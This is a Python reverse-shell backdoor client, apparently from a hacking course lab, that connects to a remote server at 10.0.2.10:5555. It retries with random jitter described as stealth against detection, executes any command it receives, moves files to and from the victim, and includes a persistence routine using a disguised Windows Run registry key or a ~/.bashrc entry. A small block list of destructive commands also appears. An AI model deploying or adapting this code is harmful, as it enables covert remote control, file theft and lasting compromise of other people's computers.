import socket
import time
import subprocess
import json
import os
import random
import sys

def reliable_send(data):
    """Send data reliably using JSON serialization"""
    try:
        jsondata = json.dumps(data)
        s.send(jsondata.encode())
    except Exception as e:
        print(f"[-] Error sending data: {str(e)}")

def reliable_recv():
    """Receive data reliably, handling partial JSON chunks"""
    data = ' '
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue  # Incomplete JSON, continue receiving
        except ConnectionResetError:
            print("[!] Connection reset by peer")
            return None
        except Exception as e:
            print(f"[-] Error receiving data: {str(e)}")
            return None

def upload_file(file_name):
    """Upload a file from target to server"""
    try:
        # Check if file exists
        if not os.path.exists(file_name):
            reliable_send(f"[-] File '{file_name}' not found!")
            return
            
        f = open(file_name, 'rb')
        s.send(f.read())
        f.close()
        reliable_send(f"[+] File '{file_name}' uploaded successfully")
    except Exception as e:
        error_msg = f"[-] Error uploading file: {str(e)}"
        reliable_send(error_msg)
        print(error_msg)

def download_file(file_name):
    """Download a file from server to target"""
    try:
        f = open(file_name, 'wb')
        s.settimeout(1)  # 1 second timeout to detect end of file
        chunk = s.recv(1024)
        while chunk:
            f.write(chunk)
            try:
                chunk = s.recv(1024)
            except socket.timeout as e:
                break  # No more data, file transfer complete
        s.settimeout(None)  # Reset timeout
        f.close()
        reliable_send(f"[+] File '{file_name}' downloaded successfully")
    except Exception as e:
        error_msg = f"[-] Error downloading file: {str(e)}"
        reliable_send(error_msg)
        print(error_msg)

def execute_command(command):
    """Execute system command securely with timeout"""
    try:
        # Security: Block dangerous commands to prevent system damage
        dangerous_commands = ['format', 'del /f', 'rm -rf /', 'dd if=', 'mkfs']
        for dangerous in dangerous_commands:
            if dangerous in command.lower():
                return f"[-] Command '{dangerous}' is blocked for security reasons"
        
        # Execute command with timeout
        execute = subprocess.Popen(
            command, 
            shell=True, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE, 
            stdin=subprocess.PIPE,
            timeout=30  # 30 second timeout to prevent hanging
        )
        
        try:
            stdout, stderr = execute.communicate(timeout=30)
            result = stdout + stderr
            result = result.decode('utf-8', errors='ignore')
            
            if not result:
                result = "[+] Command executed successfully (no output)"
                
            return result
            
        except subprocess.TimeoutExpired:
            execute.kill()  # Kill the process if it times out
            return "[-] Command timed out after 30 seconds"
            
    except Exception as e:
        return f"[-] Error executing command: {str(e)}"

def handle_clear():
    """Clear the terminal screen (cross-platform)"""
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
        return "[+] Screen cleared"
    except Exception as e:
        return f"[-] Error clearing screen: {str(e)}"

def shell():
    """Main shell loop to process server commands"""
    while True:
        try:
            # Receive command from server
            command = reliable_recv()
            if command is None:
                break  # Connection lost
                
            # Process different command types
            if command == 'quit':
                break
                
            elif command == 'clear':
                handle_clear()
                reliable_send("[+] Screen cleared on target")
                
            elif command[:3] == 'cd ':
                # Change directory on target
                try:
                    os.chdir(command[3:])
                    reliable_send(f"[+] Changed directory to: {os.getcwd()}")
                except Exception as e:
                    reliable_send(f"[-] Error changing directory: {str(e)}")
                    
            elif command[:8] == 'download':
                # Upload file to server (called 'download' on server side)
                upload_file(command[9:])
                
            elif command[:6] == 'upload':
                # Download file from server (called 'upload' on server side)
                download_file(command[7:])
                
            else:
                # Execute system command and send result
                result = execute_command(command)
                reliable_send(result)
                
        except ConnectionResetError:
            print("[!] Connection reset by server")
            break
        except KeyboardInterrupt:
            print("\n[!] Interrupted by user")
            break
        except Exception as e:
            print(f"[-] Error in shell: {str(e)}")
            try:
                reliable_send(f"[-] Shell error: {str(e)}")
            except:
                break

def connect_with_retry():
    """Connect to server with retry logic and random jitter"""
    global s
    
    while True:
        try:
            # Random jitter for stealth (avoid detection patterns)
            delay = 20 + random.randint(0, 30)
            print(f"[+] Next connection attempt in {delay} seconds...")
            time.sleep(delay)
            
            # Create new socket (old one might be in error state)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)  # Connection timeout
            
            print("[+] Attempting to connect to server...")
            s.connect(('10.0.2.10', 5555))
            s.settimeout(None)  # Remove timeout after successful connection
            
            print("[+] Connected to server!")
            shell()  # Start shell loop
            
            print("[+] Shell ended, closing connection...")
            s.close()
            break  # Exit loop after successful execution
            
        except socket.timeout:
            print("[-] Connection attempt timed out")
            continue  # Try again
        except ConnectionRefusedError:
            print("[-] Connection refused - server may not be running")
            continue  # Try again
        except socket.error as e:
            print(f"[-] Socket error: {str(e)}")
            continue  # Try again
        except Exception as e:
            print(f"[-] Unexpected error: {str(e)}")
            continue  # Try again

def setup_persistence():
    """Optional: Set up persistence mechanism"""
    try:
        if os.name == 'nt':  # Windows
            import winreg
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE)
            winreg.SetValueEx(handle, "SystemHelper", 0, winreg.REG_SZ, sys.executable + " " + __file__)
            winreg.CloseKey(handle)
            print("[+] Persistence added to Windows Registry")
            
        elif os.name == 'posix':  # Linux/Mac
            rc_file = os.path.expanduser("~/.bashrc")
            with open(rc_file, 'a') as f:
                f.write(f"\n# System helper\npython3 {__file__} &\n")
            print("[+] Persistence added to .bashrc")
            
    except Exception as e:
        print(f"[-] Error setting up persistence: {str(e)}")

if __name__ == "__main__":
    print("[+] Backdoor starting...")
    
    # Optional: Enable persistence (commented by default)
    # setup_persistence()
    
    s = None
    try:
        connect_with_retry()  # Start connection process
    except KeyboardInterrupt:
        print("\n[!] Backdoor stopped by user")
    finally:
        # Clean up socket
        if s:
            try:
                s.close()
            except:
                pass
        print("[+] Backdoor terminated")